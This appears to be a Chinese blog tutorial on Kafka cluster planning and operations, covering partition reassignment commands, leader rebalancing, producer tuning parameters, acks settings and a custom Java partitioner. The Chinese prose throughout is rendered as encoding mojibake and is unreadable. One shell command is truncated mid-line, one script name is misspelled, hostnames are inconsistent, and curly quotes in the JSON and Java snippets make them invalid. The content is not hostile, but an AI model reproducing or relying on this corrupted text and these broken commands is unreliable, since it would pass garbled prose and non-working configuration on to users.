<h3 id="é›†ç¾¤è§„åˆ’"><a href="#é›†ç¾¤è§„åˆ’" class="headerlink" title="é›†ç¾¤è§„åˆ’"></a>é›†ç¾¤è§„åˆ’</h3><p>è¯·æ±‚é‡ è§„åˆ’ç‰©ç†æœºçš„ä¸ªæ•° åˆ†æç£ç›˜çš„ä¸ªæ•°ï¼Œé€‰æ‹©ä½¿ç”¨ä»€ä¹ˆæ ·çš„ç£ç›˜ å†…å­˜ cpu core ç½‘å¡å°±æ˜¯å‘Šè¯‰å¤§å®¶ï¼Œä»¥åè¦æ˜¯å…¬å¸é‡Œé¢æœ‰ä»€ä¹ˆéœ€æ±‚ï¼Œè¿›è¡Œèµ„æºçš„è¯„ä¼°ï¼ŒæœåŠ¡å™¨çš„è¯„ä¼°ï¼Œå¤§å®¶æŒ‰ç…§æˆ‘çš„æ€è·¯å»è¯„ä¼°</p>
<p><strong>ä¸€æ¡æ¶ˆæ¯çš„å¤§å° 50kb -&gt; 1kb 500byte 1M</strong>ip ä¸»æœºå 192.168.0.100 hadoop1 192.168.0.101 hadoop2 192.168.0.102 hadoop3</p>
<p>ä¸»æœºçš„è§„åˆ’ï¼škafkaé›†ç¾¤æ¶æ„çš„æ—¶å€™ï¼šä¸»ä»å¼çš„æ¶æ„ï¼šcontroller -&gt; é€šè¿‡zké›†ç¾¤æ¥ç®¡ç†æ•´ä¸ªé›†ç¾¤çš„å…ƒæ•°æ®ã€‚</p>
<ol>
<li>zookeeperé›†ç¾¤ hadoop1 hadoop2 hadoop3</li>
<li>kafkaé›†ç¾¤ ç†è®ºä¸Šæ¥è®²ï¼Œæˆ‘ä»¬ä¸åº”è¯¥æŠŠkafkaçš„æœåŠ¡äºzkçš„æœåŠ¡å®‰è£…åœ¨ä¸€èµ·ã€‚ä½†æ˜¯æˆ‘ä»¬è¿™å„¿æœåŠ¡å™¨æœ‰é™ã€‚æ‰€ä»¥æˆ‘ä»¬kafkaé›†ç¾¤ä¹Ÿæ˜¯å®‰è£…åœ¨hadoop1 haadoop2 hadoop3</li>
</ol>
<h2 id="kafkaè¿ç»´"><a href="#kafkaè¿ç»´" class="headerlink" title="kafkaè¿ç»´"></a>kafkaè¿ç»´</h2><h3 id="å¸¸è§è¿ç»´å·¥å…·ä»‹ç»"><a href="#å¸¸è§è¿ç»´å·¥å…·ä»‹ç»" class="headerlink" title="å¸¸è§è¿ç»´å·¥å…·ä»‹ç»"></a>å¸¸è§è¿ç»´å·¥å…·ä»‹ç»</h3><p>KafkaManager â€” é¡µé¢ç®¡ç†å·¥å…·</p>
<h3 id="å¸¸è§è¿ç»´å‘½ä»¤"><a href="#å¸¸è§è¿ç»´å‘½ä»¤" class="headerlink" title="å¸¸è§è¿ç»´å‘½ä»¤"></a>å¸¸è§è¿ç»´å‘½ä»¤</h3><h4 id="åœºæ™¯ä¸€ï¼štopicæ•°æ®é‡å¤ªå¤§ï¼Œè¦å¢åŠ topicæ•°"><a href="#åœºæ™¯ä¸€ï¼štopicæ•°æ®é‡å¤ªå¤§ï¼Œè¦å¢åŠ topicæ•°" class="headerlink" title="åœºæ™¯ä¸€ï¼štopicæ•°æ®é‡å¤ªå¤§ï¼Œè¦å¢åŠ topicæ•°"></a>åœºæ™¯ä¸€ï¼š<strong>topicæ•°æ®é‡å¤ªå¤§ï¼Œè¦å¢åŠ topicæ•°</strong></h4><p>ä¸€å¼€å§‹åˆ›å»ºä¸»é¢˜çš„æ—¶å€™ï¼Œæ•°æ®é‡ä¸å¤§ï¼Œç»™çš„åˆ†åŒºæ•°ä¸å¤šã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kafka-topics.sh --create --zookeeper hadoop1:2181,hadoop2:2181,hadoop3:2181 --replication-factor 1 --partitions 1 --topic test6</span><br><span class="line">kafka-topics.sh --alter --zookeeper hadoop1:2181,hadoop2:2181,ha</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>broker idï¼š</p>
<p>hadoop1:0 hadoop2:1 hadoop3:2 å‡è®¾ä¸€ä¸ªpartitionæœ‰ä¸‰ä¸ªå‰¯æœ¬ï¼špartition0ï¼ša,b,c</p>
<p>aï¼šleader partition bï¼Œc:follower partition</p>
<p>ISR:{a,b,c}<code>å¦‚æœä¸€ä¸ªfolloweråˆ†åŒº è¶…è¿‡10ç§’ æ²¡æœ‰å‘leader partitionå»æ‹‰å–æ•°æ®ï¼Œé‚£ä¹ˆè¿™ä¸ªåˆ†åŒºå°±ä»ISRåˆ—è¡¨é‡Œé¢ç§»é™¤ã€‚</code></p>
<h4 id="åœºæ™¯äºŒï¼šæ ¸å¿ƒtopicå¢åŠ å‰¯æœ¬å› å­"><a href="#åœºæ™¯äºŒï¼šæ ¸å¿ƒtopicå¢åŠ å‰¯æœ¬å› å­" class="headerlink" title="åœºæ™¯äºŒï¼šæ ¸å¿ƒtopicå¢åŠ å‰¯æœ¬å› å­"></a>åœºæ™¯äºŒï¼š<strong>æ ¸å¿ƒtopicå¢åŠ å‰¯æœ¬å› å­</strong></h4><p>å¦‚æœå¯¹æ ¸å¿ƒä¸šåŠ¡æ•°æ®éœ€è¦å¢åŠ å‰¯æœ¬å› å­ vim test.jsonè„šæœ¬ï¼Œå°†ä¸‹é¢ä¸€è¡Œjsonè„šæœ¬ä¿å­˜</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;â€œversionâ€:1,â€œpartitionsâ€:[&#123;â€œtopicâ€:â€œtest6â€,â€œpartitionâ€:0,â€œreplicasâ€:[0,1,2]&#125;,&#123;â€œtopicâ€:â€œtest6â€,â€œpartitionâ€:1,â€œreplicasâ€:[0,1,2]&#125;,&#123;â€œtopicâ€:â€œtest6â€,â€œpartitionâ€:2,â€œreplicasâ€:[0,1,2]&#125;]&#125;</span><br><span class="line"></span><br><span class="line">å¤åˆ¶ä»£ç </span><br></pre></td></tr></table></figure>

<p><strong>æ‰§è¡Œä¸Šé¢jsonè„šæœ¬ï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kafka-reassign-partitions.sh --zookeeper hadoop1:2181,hadoop2:2181,hadoop3:2181 --reassignment-json-file test.json --execute</span><br><span class="line"></span><br><span class="line">å¤åˆ¶ä»£ç </span><br></pre></td></tr></table></figure>

<h4 id="åœºæ™¯ä¸‰ï¼šè´Ÿè½½ä¸å‡è¡¡çš„topicï¼Œæ‰‹åŠ¨è¿ç§»vi-topics-to-move-json"><a href="#åœºæ™¯ä¸‰ï¼šè´Ÿè½½ä¸å‡è¡¡çš„topicï¼Œæ‰‹åŠ¨è¿ç§»vi-topics-to-move-json" class="headerlink" title="åœºæ™¯ä¸‰ï¼šè´Ÿè½½ä¸å‡è¡¡çš„topicï¼Œæ‰‹åŠ¨è¿ç§»vi topics-to-move.json"></a>åœºæ™¯ä¸‰ï¼š<strong>è´Ÿè½½ä¸å‡è¡¡çš„topicï¼Œæ‰‹åŠ¨è¿ç§»</strong>vi topics-to-move.json</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;â€œtopicsâ€: [&#123;â€œtopicâ€: â€œtest01â€&#125;, &#123;â€œtopicâ€: â€œtest02â€&#125;], â€œversionâ€: 1&#125; // æŠŠä½ æ‰€æœ‰çš„topicéƒ½å†™åœ¨è¿™é‡Œ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kafka-reassgin-partitions.sh --zookeeper hadoop1:2181,hadoop2:2181,hadoop3:2181 --topics-to-move-json-file topics-to-move.json --broker-list â€œ5,6â€ --generate</span><br><span class="line"></span><br><span class="line">å¤åˆ¶ä»£ç </span><br></pre></td></tr></table></figure>

<p>æŠŠä½ æ‰€æœ‰çš„åŒ…æ‹¬æ–°åŠ å…¥çš„brokeræœºå™¨éƒ½å†™åœ¨è¿™é‡Œï¼Œå°±ä¼šè¯´æ˜¯æŠŠæ‰€æœ‰çš„partitionå‡åŒ€çš„åˆ†æ•£åœ¨å„ä¸ªbrokerä¸Šï¼ŒåŒ…æ‹¬æ–°è¿›æ¥çš„brokeræ­¤æ—¶ä¼šç”Ÿæˆä¸€ä¸ªè¿ç§»æ–¹æ¡ˆï¼Œå¯ä»¥ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œå»ï¼šexpand-cluster-reassignment.json</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kafka-reassign-partitions.sh --zookeeper hadoop01:2181,hadoop02:2181,hadoop03:2181 --reassignment-json-file expand-cluster-reassignment.json --execute</span><br><span class="line"></span><br><span class="line">kafka-reassign-partitions.sh --zookeeper hadoop01:2181,hadoop02:2181,hadoop03:2181 --reassignment-json-file expand-cluster-reassignment.json --verify</span><br><span class="line"></span><br><span class="line">å¤åˆ¶ä»£ç </span><br></pre></td></tr></table></figure>

<p>è¿™ç§æ•°æ®è¿ç§»æ“ä½œä¸€å®šè¦åœ¨æ™šä¸Šä½å³°çš„æ—¶å€™æ¥åšï¼Œå› ä¸ºä»–ä¼šåœ¨æœºå™¨ä¹‹é—´è¿ç§»æ•°æ®ï¼Œéå¸¸çš„å ç”¨å¸¦å®½èµ„æº<code>â€“generate:</code> æ ¹æ®ç»™äºˆçš„Topicåˆ—è¡¨å’ŒBrokeråˆ—è¡¨ç”Ÿæˆè¿ç§»è®¡åˆ’ã€‚generateå¹¶ä¸ä¼šçœŸæ­£è¿›è¡Œæ¶ˆæ¯è¿ç§»ï¼Œè€Œæ˜¯å°†æ¶ˆæ¯è¿ç§»è®¡åˆ’è®¡ç®—å‡ºæ¥ï¼Œä¾›executeå‘½ä»¤ä½¿ç”¨ã€‚â€“execute: æ ¹æ®ç»™äºˆçš„æ¶ˆæ¯è¿ç§»è®¡åˆ’è¿›è¡Œè¿ç§»ã€‚â€“verify: æ£€æŸ¥æ¶ˆæ¯æ˜¯å¦å·²ç»è¿ç§»å®Œæˆã€‚</p>
<h4 id="åœºæ™¯å››ï¼šå¦‚æœæŸä¸ªbroker-leader-partitionè¿‡å¤š"><a href="#åœºæ™¯å››ï¼šå¦‚æœæŸä¸ªbroker-leader-partitionè¿‡å¤š" class="headerlink" title="åœºæ™¯å››ï¼šå¦‚æœæŸä¸ªbroker leader partitionè¿‡å¤š"></a>åœºæ™¯å››ï¼š<strong>å¦‚æœæŸä¸ªbroker leader partitionè¿‡å¤š</strong></h4><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„leader partitionåœ¨æœåŠ¡å™¨ä¹‹é—´æ˜¯è´Ÿè½½å‡è¡¡ã€‚hadoop1 4 hadoop2 1 hadoop3 1</p>
<p>ç°åœ¨å„ä¸ªä¸šåŠ¡æ–¹å¯ä»¥è‡ªè¡Œç”³è¯·åˆ›å»º topicï¼Œåˆ†åŒºæ•°é‡éƒ½æ˜¯è‡ªåŠ¨åˆ†é…å’Œåç»­åŠ¨æ€è°ƒæ•´çš„ï¼Œ kafkaæœ¬èº«ä¼šè‡ªåŠ¨æŠŠleader partitionå‡åŒ€åˆ†æ•£åœ¨å„ä¸ªæœºå™¨ä¸Šï¼Œè¿™æ ·å¯ä»¥ä¿è¯æ¯å°æœºå™¨çš„è¯»å†™ååé‡éƒ½æ˜¯å‡åŒ€çš„ ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–ï¼Œé‚£å°±æ˜¯å¦‚æœæŸäº›brokerå®•æœºï¼Œä¼šå¯¼è‡´ leader partition è¿‡äºé›†ä¸­åœ¨å…¶ä»–å°‘éƒ¨åˆ†å‡ å°brokerä¸Šï¼Œ è¿™ä¼šå¯¼è‡´å°‘æ•°å‡ å°brokerçš„è¯»å†™è¯·æ±‚å‹åŠ›è¿‡é«˜ï¼Œå…¶ä»–å®•æœºçš„ broker é‡å¯ä¹‹åéƒ½æ˜¯folloer partitionï¼Œè¯»å†™è¯·æ±‚å¾ˆä½ï¼Œé€ æˆé›†ç¾¤è´Ÿè½½ä¸å‡è¡¡æœ‰ä¸€ä¸ªå‚æ•°ï¼Œauto.leader.rebalance.enableï¼Œé»˜è®¤æ˜¯trueï¼Œ æ¯éš”300ç§’ï¼ˆleader.imbalance.check.interval.secondsï¼‰æ£€æŸ¥leaderè´Ÿè½½æ˜¯å¦å¹³è¡¡ å¦‚æœä¸€å°brokerä¸Šçš„ä¸å‡è¡¡çš„leaderè¶…è¿‡äº†10%ï¼Œleader.imbalance.per.broker.percentageï¼Œ å°±ä¼šå¯¹è¿™ä¸ªbrokerè¿›è¡Œé€‰ä¸¾ é…ç½®å‚æ•°ï¼šauto.leader.rebalance.enable é»˜è®¤æ˜¯true leader.imbalance.per.broker.percentage: æ¯ä¸ªbrokerå…è®¸çš„ä¸å¹³è¡¡çš„leaderçš„æ¯”ç‡ã€‚å¦‚æœæ¯ä¸ªbrokerè¶…è¿‡äº†è¿™ä¸ªå€¼ï¼Œæ§åˆ¶å™¨ä¼šè§¦å‘leaderçš„å¹³è¡¡ã€‚è¿™ä¸ªå€¼è¡¨ç¤ºç™¾åˆ†æ¯”ã€‚10% leader.imbalance.check.interval.secondsï¼šé»˜è®¤å€¼300ç§’</p>
<h2 id="Kafkaç”Ÿäº§è€…"><a href="#Kafkaç”Ÿäº§è€…" class="headerlink" title="Kafkaç”Ÿäº§è€…"></a>Kafkaç”Ÿäº§è€…</h2><h3 id="ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åŸç†"><a href="#ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åŸç†" class="headerlink" title="ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åŸç†"></a>ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åŸç†</h3><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/37f947d9da28495fac11a0561168dfc3~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<h3 id="ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åŸç†â€”åŸºç¡€æ¡ˆä¾‹æ¼”ç¤º"><a href="#ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åŸç†â€”åŸºç¡€æ¡ˆä¾‹æ¼”ç¤º" class="headerlink" title="ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åŸç†â€”åŸºç¡€æ¡ˆä¾‹æ¼”ç¤º"></a>ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åŸç†â€”åŸºç¡€æ¡ˆä¾‹æ¼”ç¤º</h3><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1a581ad65990450ba37c5fe7fae0ccfd~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<h3 id="å¦‚ä½•æå‡ååé‡"><a href="#å¦‚ä½•æå‡ååé‡" class="headerlink" title="å¦‚ä½•æå‡ååé‡"></a>å¦‚ä½•æå‡ååé‡</h3><p>å¦‚ä½•æå‡ååé‡ï¼šå‚æ•°ä¸€ï¼š<code>buffer.memory</code>ï¼šè®¾ç½®å‘é€æ¶ˆæ¯çš„ç¼“å†²åŒºï¼Œé»˜è®¤å€¼æ˜¯33554432ï¼Œå°±æ˜¯32MB å‚æ•°äºŒï¼š<code>compression.type</code>ï¼šé»˜è®¤æ˜¯noneï¼Œä¸å‹ç¼©ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ä½¿ç”¨lz4å‹ç¼©ï¼Œæ•ˆç‡è¿˜æ˜¯ä¸é”™çš„ï¼Œå‹ç¼©ä¹‹åå¯ä»¥å‡å°æ•°æ®é‡ï¼Œæå‡ååé‡ï¼Œä½†æ˜¯ä¼šåŠ å¤§producerç«¯çš„cpuå¼€é”€ å‚æ•°ä¸‰ï¼š<code>batch.size</code>ï¼šè®¾ç½®batchçš„å¤§å°ï¼Œå¦‚æœbatchå¤ªå°ï¼Œä¼šå¯¼è‡´é¢‘ç¹ç½‘ç»œè¯·æ±‚ï¼Œååé‡ä¸‹é™ï¼›å¦‚æœbatchå¤ªå¤§ï¼Œä¼šå¯¼è‡´ä¸€æ¡æ¶ˆæ¯éœ€è¦ç­‰å¾…å¾ˆä¹…æ‰èƒ½è¢«å‘é€å‡ºå»ï¼Œè€Œä¸”ä¼šè®©å†…å­˜ç¼“å†²åŒºæœ‰å¾ˆå¤§å‹åŠ›ï¼Œè¿‡å¤šæ•°æ®ç¼“å†²åœ¨å†…å­˜é‡Œï¼Œé»˜è®¤å€¼æ˜¯ï¼š16384ï¼Œå°±æ˜¯16kbï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªbatchæ»¡äº†16kbå°±å‘é€å‡ºå»ï¼Œä¸€èˆ¬åœ¨å®é™…ç”Ÿäº§ç¯å¢ƒï¼Œè¿™ä¸ªbatchçš„å€¼å¯ä»¥å¢å¤§ä¸€äº›æ¥æå‡ååé‡ï¼Œå¦‚æœä¸€ä¸ªæ‰¹æ¬¡è®¾ç½®å¤§äº†ï¼Œä¼šæœ‰å»¶è¿Ÿã€‚ä¸€èˆ¬æ ¹æ®ä¸€æ¡æ¶ˆæ¯å¤§å°æ¥è®¾ç½®ã€‚å¦‚æœæˆ‘ä»¬æ¶ˆæ¯æ¯”è¾ƒå°‘ã€‚é…åˆä½¿ç”¨çš„å‚æ•°linger.msï¼Œè¿™ä¸ªå€¼é»˜è®¤æ˜¯0ï¼Œæ„æ€å°±æ˜¯æ¶ˆæ¯å¿…é¡»ç«‹å³è¢«å‘é€ï¼Œä½†æ˜¯è¿™æ˜¯ä¸å¯¹çš„ï¼Œä¸€èˆ¬è®¾ç½®ä¸€ä¸ª100æ¯«ç§’ä¹‹ç±»çš„ï¼Œè¿™æ ·çš„è¯å°±æ˜¯è¯´ï¼Œè¿™ä¸ªæ¶ˆæ¯è¢«å‘é€å‡ºå»åè¿›å…¥ä¸€ä¸ªbatchï¼Œå¦‚æœ100æ¯«ç§’å†…ï¼Œè¿™ä¸ªbatchæ»¡äº†16kbï¼Œè‡ªç„¶å°±ä¼šå‘é€å‡ºå»ã€‚</p>
<h3 id="å¦‚ä½•å¤„ç†å¼‚å¸¸"><a href="#å¦‚ä½•å¤„ç†å¼‚å¸¸" class="headerlink" title="å¦‚ä½•å¤„ç†å¼‚å¸¸"></a>å¦‚ä½•å¤„ç†å¼‚å¸¸</h3><ol>
<li>LeaderNotAvailableExceptionï¼šè¿™ä¸ªå°±æ˜¯å¦‚æœæŸå°æœºå™¨æŒ‚äº†ï¼Œæ­¤æ—¶leaderå‰¯æœ¬ä¸å¯ç”¨ï¼Œä¼šå¯¼è‡´ä½ å†™å…¥å¤±è´¥ï¼Œè¦ç­‰å¾…å…¶ä»–followerå‰¯æœ¬åˆ‡æ¢ä¸ºleaderå‰¯æœ¬ä¹‹åï¼Œæ‰èƒ½ç»§ç»­å†™å…¥ï¼Œæ­¤æ—¶å¯ä»¥é‡è¯•å‘é€å³å¯ï¼›å¦‚æœè¯´ä½ å¹³æ—¶é‡å¯kafkaçš„brokerè¿›ç¨‹ï¼Œè‚¯å®šä¼šå¯¼è‡´leaderåˆ‡æ¢ï¼Œä¸€å®šä¼šå¯¼è‡´ä½ å†™å…¥æŠ¥é”™ï¼Œæ˜¯LeaderNotAvailableExceptionã€‚</li>
<li>NotControllerExceptionï¼šè¿™ä¸ªä¹Ÿæ˜¯åŒç†ï¼Œå¦‚æœè¯´Controlleræ‰€åœ¨BrokeræŒ‚äº†ï¼Œé‚£ä¹ˆæ­¤æ—¶ä¼šæœ‰é—®é¢˜ï¼Œéœ€è¦ç­‰å¾…Controlleré‡æ–°é€‰ä¸¾ï¼Œæ­¤æ—¶ä¹Ÿæ˜¯ä¸€æ ·å°±æ˜¯é‡è¯•å³å¯ã€‚</li>
<li>NetworkExceptionï¼šç½‘ç»œå¼‚å¸¸ timeout a. é…ç½®retrieså‚æ•°ï¼Œä»–ä¼šè‡ªåŠ¨é‡è¯•çš„ b. ä½†æ˜¯å¦‚æœé‡è¯•å‡ æ¬¡ä¹‹åè¿˜æ˜¯ä¸è¡Œï¼Œå°±ä¼šæä¾›Exceptionç»™æˆ‘ä»¬æ¥å¤„ç†äº†,æˆ‘ä»¬è·å–åˆ°å¼‚å¸¸ä»¥åï¼Œå†å¯¹è¿™ä¸ªæ¶ˆæ¯è¿›è¡Œå•ç‹¬å¤„ç†ã€‚æˆ‘ä»¬ä¼šæœ‰å¤‡ç”¨çš„é“¾è·¯ã€‚å‘é€ä¸æˆåŠŸçš„æ¶ˆæ¯å‘é€åˆ°Redisæˆ–è€…å†™åˆ°æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œç”šè‡³æ˜¯ä¸¢å¼ƒã€‚</li>
</ol>
<h3 id="é‡è¯•æœºåˆ¶"><a href="#é‡è¯•æœºåˆ¶" class="headerlink" title="é‡è¯•æœºåˆ¶"></a>é‡è¯•æœºåˆ¶</h3><p>é‡è¯•ä¼šå¸¦æ¥ä¸€äº›é—®é¢˜ï¼š</p>
<ol>
<li><strong>æ¶ˆæ¯ä¼šé‡å¤</strong>æœ‰çš„æ—¶å€™ä¸€äº›leaderåˆ‡æ¢ä¹‹ç±»çš„é—®é¢˜ï¼Œéœ€è¦è¿›è¡Œé‡è¯•ï¼Œè®¾ç½®retrieså³å¯ï¼Œä½†æ˜¯æ¶ˆæ¯é‡è¯•ä¼šå¯¼è‡´,é‡å¤å‘é€çš„é—®é¢˜ï¼Œæ¯”å¦‚è¯´ç½‘ç»œæŠ–åŠ¨ä¸€ä¸‹å¯¼è‡´ä»–ä»¥ä¸ºæ²¡æˆåŠŸï¼Œå°±é‡è¯•äº†ï¼Œå…¶å®äººå®¶éƒ½æˆåŠŸäº†.</li>
<li><strong>æ¶ˆæ¯ä¹±åº</strong>æ¶ˆæ¯é‡è¯•æ˜¯å¯èƒ½å¯¼è‡´æ¶ˆæ¯çš„ä¹±åºçš„ï¼Œå› ä¸ºå¯èƒ½æ’åœ¨ä½ åé¢çš„æ¶ˆæ¯éƒ½å‘é€å‡ºå»äº†ã€‚æ‰€ä»¥å¯ä»¥ä½¿ç”¨â€max.in.flight.requests.per.connectionâ€å‚æ•°è®¾ç½®ä¸º1ï¼Œ è¿™æ ·å¯ä»¥ä¿è¯produceråŒä¸€æ—¶é—´åªèƒ½å‘é€ä¸€æ¡æ¶ˆæ¯ã€‚ä¸¤æ¬¡é‡è¯•çš„é—´éš”é»˜è®¤æ˜¯100æ¯«ç§’ï¼Œç”¨â€retry.backoff.msâ€æ¥è¿›è¡Œè®¾ç½® åŸºæœ¬ä¸Šåœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œé é‡è¯•æœºåˆ¶åŸºæœ¬å°±å¯ä»¥æå®š95%çš„å¼‚å¸¸é—®é¢˜ã€‚</li>
</ol>
<h3 id="ACKå‚æ•°è¯¦è§£"><a href="#ACKå‚æ•°è¯¦è§£" class="headerlink" title="ACKå‚æ•°è¯¦è§£"></a>ACKå‚æ•°è¯¦è§£</h3><p>producerç«¯è®¾ç½®çš„ request.required.acks&#x3D;0ï¼›åªè¦è¯·æ±‚å·²å‘é€å‡ºå»ï¼Œå°±ç®—æ˜¯å‘é€å®Œäº†ï¼Œä¸å…³å¿ƒæœ‰æ²¡æœ‰å†™æˆåŠŸã€‚æ€§èƒ½å¾ˆå¥½ï¼Œå¦‚æœæ˜¯å¯¹ä¸€äº›æ—¥å¿—è¿›è¡Œåˆ†æï¼Œå¯ä»¥æ‰¿å—ä¸¢æ•°æ®çš„æƒ…å†µï¼Œç”¨è¿™ä¸ªå‚æ•°ï¼Œæ€§èƒ½ä¼šå¾ˆå¥½ã€‚request.required.acks&#x3D;1ï¼›å‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œå½“leader partitionå†™å…¥æˆåŠŸä»¥åï¼Œæ‰ç®—å†™å…¥æˆåŠŸã€‚ä¸è¿‡è¿™ç§æ–¹å¼ä¹Ÿæœ‰ä¸¢æ•°æ®çš„å¯èƒ½ã€‚request.required.acks&#x3D;-1ï¼›éœ€è¦ISRåˆ—è¡¨é‡Œé¢ï¼Œæ‰€æœ‰å‰¯æœ¬éƒ½å†™å®Œä»¥åï¼Œè¿™æ¡æ¶ˆæ¯æ‰ç®—å†™å…¥æˆåŠŸã€‚ISRï¼š1ä¸ªå‰¯æœ¬ã€‚1 leader partition 1 follower partition kafkaæœåŠ¡ç«¯ï¼šmin.insync.replicasï¼š1ï¼Œ å¦‚æœæˆ‘ä»¬ä¸è®¾ç½®çš„è¯ï¼Œé»˜è®¤è¿™ä¸ªå€¼æ˜¯1 ä¸€ä¸ªleader partitionä¼šç»´æŠ¤ä¸€ä¸ªISRåˆ—è¡¨ï¼Œè¿™ä¸ªå€¼å°±æ˜¯é™åˆ¶ISRåˆ—è¡¨é‡Œé¢ è‡³å°‘å¾—æœ‰å‡ ä¸ªå‰¯æœ¬ï¼Œæ¯”å¦‚è¿™ä¸ªå€¼æ˜¯2ï¼Œé‚£ä¹ˆå½“ISRåˆ—è¡¨é‡Œé¢åªæœ‰ä¸€ä¸ªå‰¯æœ¬çš„æ—¶å€™ã€‚å¾€è¿™ä¸ªåˆ†åŒºæ’å…¥æ•°æ®çš„æ—¶å€™ä¼šæŠ¥é”™ã€‚è®¾è®¡ä¸€ä¸ªä¸ä¸¢æ•°æ®çš„æ–¹æ¡ˆï¼šæ•°æ®ä¸ä¸¢å¤±çš„æ–¹æ¡ˆï¼š1)åˆ†åŒºå‰¯æœ¬ &gt;&#x3D;2 2)acks &#x3D; -1 3)min.insync.replicas &gt;&#x3D;2 è¿˜æœ‰å¯èƒ½å°±æ˜¯å‘é€æœ‰å¼‚å¸¸ï¼šå¯¹å¼‚å¸¸è¿›è¡Œå¤„ç†</p>
<h3 id="è‡ªå®šä¹‰åˆ†åŒº"><a href="#è‡ªå®šä¹‰åˆ†åŒº" class="headerlink" title="è‡ªå®šä¹‰åˆ†åŒº"></a>è‡ªå®šä¹‰åˆ†åŒº</h3><p>åˆ†åŒºï¼š1ã€<strong>æ²¡æœ‰è®¾ç½®key</strong>æˆ‘ä»¬çš„æ¶ˆæ¯å°±ä¼šè¢«è½®è®­çš„å‘é€åˆ°ä¸åŒçš„åˆ†åŒºã€‚2ã€<strong>è®¾ç½®äº†key</strong>kafkaè‡ªå¸¦çš„åˆ†åŒºå™¨ï¼Œä¼šæ ¹æ®keyè®¡ç®—å‡ºæ¥ä¸€ä¸ªhashå€¼ï¼Œè¿™ä¸ªhashå€¼ä¼šå¯¹åº”æŸä¸€ä¸ªåˆ†åŒºã€‚å¦‚æœkeyç›¸åŒçš„ï¼Œé‚£ä¹ˆhashå€¼å¿…ç„¶ç›¸åŒï¼Œkeyç›¸åŒçš„å€¼ï¼Œå¿…ç„¶æ˜¯ä¼šè¢«å‘é€åˆ°åŒä¸€ä¸ªåˆ†åŒºã€‚ä½†æ˜¯æœ‰äº›æ¯”è¾ƒç‰¹æ®Šçš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦è‡ªå®šä¹‰åˆ†åŒº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class HotDataPartitioner implements Partitioner &#123;</span><br><span class="line">private Random random;</span><br><span class="line">@Override</span><br><span class="line">public void configure(Map&lt;String, ?&gt; configs) &#123;</span><br><span class="line">random = new Random();</span><br><span class="line">&#125;</span><br><span class="line">@Override</span><br><span class="line">public int partition(String topic, Object keyObj, byte[] keyBytes, Object value, byte[] valueBytes, Cluster cluster) &#123;</span><br><span class="line">String key = (String)keyObj;</span><br><span class="line">List partitionInfoList = cluster.availablePartitionsForTopic(topic);</span><br><span class="line">//è·å–åˆ°åˆ†åŒºçš„ä¸ªæ•° 0,1ï¼Œ2</span><br><span class="line">int partitionCount = partitionInfoList.size();</span><br><span class="line">//æœ€åä¸€ä¸ªåˆ†åŒº</span><br><span class="line">int hotDataPartition = partitionCount - 1;</span><br><span class="line">return !key.contains(â€œhot_dataâ€) ? random.nextInt(partitionCount - 1) : hotDataPartition;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">å¤åˆ¶ä»£ç </span><br></pre></td></tr></table></figure>

<p>å¦‚ä½•ä½¿ç”¨ï¼šé…ç½®ä¸Šè¿™ä¸ªç±»å³å¯ï¼š<strong>props.put(â€partitioner.classâ€, â€œcom.zhss.HotDataPartitionerâ€)</strong>;</p>
<h3 id="ç»¼åˆæ¡ˆä¾‹æ¼”ç¤º"><a href="#ç»¼åˆæ¡ˆä¾‹æ¼”ç¤º" class="headerlink" title="ç»¼åˆæ¡ˆä¾‹æ¼”ç¤º"></a>ç»¼åˆæ¡ˆä¾‹æ¼”ç¤º</h3><p>1æ¶ˆè´¹ç»„æ¦‚å¿µ groupidç›¸åŒå°±å±äºåŒä¸€ä¸ªæ¶ˆè´¹ç»„ 1ï¼‰æ¯ä¸ªconsumeréƒ½è¦å±äºä¸€ä¸ªconsumer.groupï¼Œå°±æ˜¯ä¸€ä¸ªæ¶ˆè´¹ç»„ï¼Œtopicçš„ä¸€ä¸ªåˆ†åŒºåªä¼šåˆ†é…ç»™ ä¸€ä¸ªæ¶ˆè´¹ç»„ä¸‹çš„ä¸€ä¸ªconsumeræ¥å¤„ç†ï¼Œæ¯ä¸ªconsumerå¯èƒ½ä¼šåˆ†é…å¤šä¸ªåˆ†åŒºï¼Œä¹Ÿæœ‰å¯èƒ½æŸä¸ªconsumeræ²¡æœ‰åˆ†é…åˆ°ä»»ä½•åˆ†åŒº 2ï¼‰å¦‚æœæƒ³è¦å®ç°ä¸€ä¸ªå¹¿æ’­çš„æ•ˆæœï¼Œé‚£åªéœ€è¦ä½¿ç”¨ä¸åŒçš„group idå»æ¶ˆè´¹å°±å¯ä»¥ã€‚topicA: partition0ã€partition1 